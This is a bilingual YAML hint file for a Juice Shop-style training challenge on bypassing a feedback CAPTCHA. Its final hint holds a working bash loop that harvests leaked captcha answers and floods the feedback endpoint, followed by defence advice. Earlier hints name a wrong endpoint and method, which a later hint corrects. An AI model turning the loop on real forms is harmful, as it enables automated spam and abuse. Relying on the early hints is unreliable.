challenge_key: "captchaBypassChallenge"
schema_version: "juicelab.hints.v2"

hints:
  N1:
    cost_pct: 5
    text_fr: |
      Hint OWASP : "feedback rate limiting". Le CAPTCHA est cote serveur
      mais le rate limiting laisse passer trop de requetes en peu de temps.
    text_en: |
      OWASP hint: "feedback rate limiting". CAPTCHA is server-side but
      rate limiting lets too many requests through in short time.
    pedagogical_intent: |
      Activate rate-limit reflex.

  N2:
    cost_pct: 10
    text_fr: |
      Le challenge est resolu si tu arrives a submit 10 feedbacks en moins
      de 20 secondes. Solver le math CAPTCHA programmatically (eval). API
      endpoint : POST /api/Feedbacks.
    text_en: |
      Challenge solves if you submit 10 feedbacks in less than 20 seconds.
      Solve math CAPTCHA programmatically (eval). API endpoint: POST
      /api/Feedbacks.
    pedagogical_intent: |
      Spell condition + endpoint.

  N3:
    cost_pct: 20
    text_fr: |
      DevTools Network > submit un feedback manuel > inspect la POST
      request. Headers : Authorization Bearer token. Body : { comment,
      rating, captcha, captchaId }. Pour scripter : GET /api/captcha
      retourne le challenge math.
    text_en: |
      DevTools Network > submit manual feedback > inspect POST request.
      Headers: Authorization Bearer token. Body: { comment, rating,
      captcha, captchaId }. To script: GET /api/captcha returns math
      challenge.
    pedagogical_intent: |
      Reveal API surface.

  N4:
    cost_pct: 35
    text_fr: |
      Le CAPTCHA du formulaire de feedback est a usage unique mais le
      serveur ne limite pas le DEBIT : il compte seulement les envois.
      Le challenge se resout si 10 envois de feedback valides arrivent
      en moins de 20 secondes (routes/verify.ts, captchaBypassChallenge).
      Le CAPTCHA s'obtient par GET /rest/captcha, dont la reponse
      contient DEJA la solution (champ answer) : on peut donc
      automatiser.
    text_en: |
      The feedback form CAPTCHA is single-use but the server does not
      rate-limit: it only counts submissions. The challenge solves if 10
      valid feedback submissions arrive within 20 seconds
      (routes/verify.ts, captchaBypassChallenge). The CAPTCHA comes from
      GET /rest/captcha, whose response ALREADY contains the solution
      (answer field): so it can be automated.
    pedagogical_intent: |
      Give the exact condition (10 in 20 s) and the self-solving captcha.

  N5:
    cost_pct: 50
    text_fr: |
      Solution (verifiee en recette sur Juice Shop 19.2.1) : boucle 10
      fois, en recuperant un captcha a chaque tour et en le renvoyant :
        for i in $(seq 1 10); do
          C=$(curl -s http://127.0.0.1:3000/rest/captcha)
          ID=$(echo "$C" | python3 -c "import sys,json;print(json.load(sys.stdin)['captchaId'])")
          A=$(echo "$C" | python3 -c "import sys,json;print(json.load(sys.stdin)['answer'])")
          curl -s -o /dev/null -X POST http://127.0.0.1:3000/api/Feedbacks \
            -H "Content-Type: application/json" \
            -d "{\"captchaId\":$ID,\"captcha\":\"$A\",\"comment\":\"spam $i\",\"rating\":1}"
        done
      Au 10e envoi en moins de 20 s, le challenge est resolu. Endpoint
      du captcha : /rest/captcha (pas /api/captcha).
      Defense : limiter le debit du formulaire (par IP/compte), ne pas
      renvoyer la solution du captcha au client, et invalider chaque
      captcha apres usage.
    text_en: |
      Solution (verified during testing on Juice Shop 19.2.1): loop 10
      times, fetching a captcha each round and sending it back:
        for i in $(seq 1 10); do
          C=$(curl -s http://127.0.0.1:3000/rest/captcha)
          ID=$(echo "$C" | python3 -c "import sys,json;print(json.load(sys.stdin)['captchaId'])")
          A=$(echo "$C" | python3 -c "import sys,json;print(json.load(sys.stdin)['answer'])")
          curl -s -o /dev/null -X POST http://127.0.0.1:3000/api/Feedbacks \
            -H "Content-Type: application/json" \
            -d "{\"captchaId\":$ID,\"captcha\":\"$A\",\"comment\":\"spam $i\",\"rating\":1}"
        done
      On the 10th submission within 20 s, the challenge solves. Captcha
      endpoint: /rest/captcha (not /api/captcha).
      Defense: rate-limit the form (per IP/account), do not return the
      captcha solution to the client, and invalidate each captcha after
      use.
    pedagogical_intent: |
      Full verified solution: loop with /rest/captcha, exact condition.
